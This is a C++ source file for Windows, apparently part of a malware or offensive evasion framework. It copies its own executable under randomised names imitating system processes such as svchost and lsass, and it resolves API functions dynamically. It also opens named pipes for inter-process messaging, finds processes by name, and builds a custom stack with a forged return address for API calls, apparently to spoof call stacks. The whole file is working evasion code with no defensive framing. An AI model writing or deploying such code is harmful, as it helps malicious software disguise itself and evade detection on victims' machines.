#include "RecursiveDelegationCore.h"

#include <iostream>
#include <random>
#include <sstream>
#include <tlhelp32.h>

#ifdef _DEBUG
#define DEBUG_PRINTF(...) printf(__VA_ARGS__)
#define DEBUG_COUT(x) std::cout << x
#else
#define DEBUG_PRINTF(...) do {} while (0)
#define DEBUG_COUT(x) do {} while (0)
#endif

const std::vector<std::string> MS_BINARY_NAMES = {
    "svchost", "wininit", "csrss", "lsass", "winlogon", "spoolsv", "dwm",
    "explorer", "taskmgr", "msiexec", "conhost", "rundll32", "services",
    "smss", "ntoskrnl", "regsvr32", "mmc", "dllhost", "wuauclt", "iexplore"
};

std::string GenerateRandomBinaryName() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distrib(0, static_cast<int>(MS_BINARY_NAMES.size()) - 1);
    std::stringstream ss;
    ss << MS_BINARY_NAMES[distrib(gen)] << "_" << GetTickCount64() << ".exe";
    return ss.str();
}

FARPROC ResolveFunction(const std::string& funcNameWithModule) {
    size_t pos = funcNameWithModule.find('!');
    if (pos == std::string::npos) {
        std::cerr << "ResolveFunction: Invalid format. Expected 'Module!Function', got '" << funcNameWithModule << "'" << std::endl;
        return nullptr;
    }
    std::string moduleName = funcNameWithModule.substr(0, pos);
    std::string functionName = funcNameWithModule.substr(pos + 1);
    HMODULE hModule = GetModuleHandleA(moduleName.c_str());
    if (!hModule) {
        hModule = LoadLibraryA(moduleName.c_str());
        if (!hModule) {
            std::cerr << "ResolveFunction: Failed to load module: " << moduleName << " Error: " << GetLastError() << std::endl;
            return nullptr;
        }
    }
    FARPROC procAddr = GetProcAddress(hModule, functionName.c_str());
    if (!procAddr) {
        std::cerr << "ResolveFunction: Failed to resolve function: " << functionName << " in " << moduleName << " Error: " << GetLastError() << std::endl;
    }
    return procAddr;
}

HANDLE CreateIPCPipe(const std::string& pipeName, bool isServer) {
    std::string fullPipeName = "\\\\.\\pipe\\" + pipeName;
    if (isServer) {
        return CreateNamedPipeA(fullPipeName.c_str(), PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES, 4096, 4096, 0, NULL);
    }
    else {
        HANDLE hPipe = INVALID_HANDLE_VALUE;
        for (int i = 0; i < 10; ++i) {
            hPipe = CreateFileA(fullPipeName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL,
                OPEN_EXISTING, 0, NULL);
            if (hPipe != INVALID_HANDLE_VALUE) break;
            if (GetLastError() != ERROR_PIPE_BUSY) break;
            Sleep(100);
        }
        return hPipe;
    }
}

std::string CreateCloneExecutable() {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    std::string newName = GenerateRandomBinaryName();
    std::string newPath = std::string(currentPath);
    size_t lastSlash = newPath.find_last_of('\\');
    if (lastSlash != std::string::npos) {
        newPath = newPath.substr(0, lastSlash + 1) + newName;
    }
    else {
        newPath = newName;
    }
    if (!CopyFileA(currentPath, newPath.c_str(), FALSE)) {
        std::cerr << "CreateCloneExecutable: Failed to copy file to " << newPath << " Error: " << GetLastError() << std::endl;
        return "";
    }

    if (!SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_TEMPORARY)) {
        DEBUG_PRINTF("CreateCloneExecutable: Warning - Failed to set TEMPORARY attribute on %s. Error: %lu\n",
            newPath.c_str(), GetLastError());
    }
    return newPath;
}

DWORD FindProcessPid(const wchar_t* ProcName) {
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "FindProcessPid: CreateToolhelp32Snapshot failed. Error: " << GetLastError() << std::endl;
        return 0;
    }

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, ProcName) == 0) {
                CloseHandle(hSnapshot);
                std::wcout << L"FindProcessPid: Found " << ProcName << L" with PID : " << pe32.th32ProcessID << std::endl;
                return pe32.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    else {
        std::cerr << "FindProcessPid: Process32FirstW failed. Error: " << GetLastError() << std::endl;
    }

    CloseHandle(hSnapshot);
    std::wcerr << L"FindProcessPid: " << ProcName << L" not found." << std::endl;
    return 0;
}

void* PrepareStackForApiCall(
    const std::vector<DWORD64>& stackArgs_in_order,
    FARPROC pRetAddressForApi,
    void** outStackAllocationBase
) {
    if (!pRetAddressForApi || !outStackAllocationBase) {
        std::cerr << "PrepareStackForApiCall: ERROR - Null pRetAddressForApi or outStackAllocationBase." << std::endl;
        return nullptr;
    }
    const size_t shadowSpaceSize = 32;
    const size_t retAddrSlotSize = 8;
    const size_t firstStackArgOffset = 0x28;
    size_t numStackArgs = stackArgs_in_order.size();
    size_t totalStackArgsSizeBytes = numStackArgs * sizeof(DWORD64);
    SIZE_T allocationSize = (2 << 20);
    SIZE_T minRequiredForOurData = retAddrSlotSize + shadowSpaceSize + totalStackArgsSizeBytes + 16;
    if (allocationSize < minRequiredForOurData) {
        allocationSize = minRequiredForOurData + 4096;
        DEBUG_COUT("  INFO: Increased allocationSize to " << allocationSize << " due to argument data size." << std::endl);
    }
    void* stackBase = VirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!stackBase) {
        std::cerr << "PrepareStackForApiCall: ERROR - VirtualAlloc failed. Error: " << GetLastError() << std::endl;
        return nullptr;
    }
    *outStackAllocationBase = stackBase;
    char* pStackHighWatermark = (char*)stackBase + allocationSize;
    char* pTentative_Addr_5th_Arg_Slot = pStackHighWatermark - totalStackArgsSizeBytes;
    char* pProspectiveRsp = pTentative_Addr_5th_Arg_Slot - shadowSpaceSize - retAddrSlotSize;
    DWORD64 finalRspVal = ((DWORD64)pProspectiveRsp - 8ULL) & ~15ULL;
    finalRspVal += 8ULL;
    if (finalRspVal < (DWORD64)stackBase || (finalRspVal + retAddrSlotSize) >((DWORD64)stackBase + allocationSize)) {
        std::cerr << "PrepareStackForApiCall: ERROR - finalRspVal is outside allocated stack region after alignment." << std::endl;
        VirtualFree(stackBase, 0, MEM_RELEASE); *outStackAllocationBase = nullptr; return nullptr;
    }
    *(DWORD64*)finalRspVal = (DWORD64)pRetAddressForApi;
    char* pArgWriter = (char*)finalRspVal + firstStackArgOffset;
    for (size_t i = 0; i < numStackArgs; ++i) {
        if ((pArgWriter + sizeof(DWORD64)) > ((char*)stackBase + allocationSize)) {
            std::cerr << "PrepareStackForApiCall: ERROR - About to write stack argument #" << (i + 5)
                << " out of allocated stack bounds." << std::endl;
            VirtualFree(stackBase, 0, MEM_RELEASE); *outStackAllocationBase = nullptr; return nullptr;
        }
        *(DWORD64*)pArgWriter = stackArgs_in_order[i];
        pArgWriter += sizeof(DWORD64);
    }
    return (void*)finalRspVal;
}
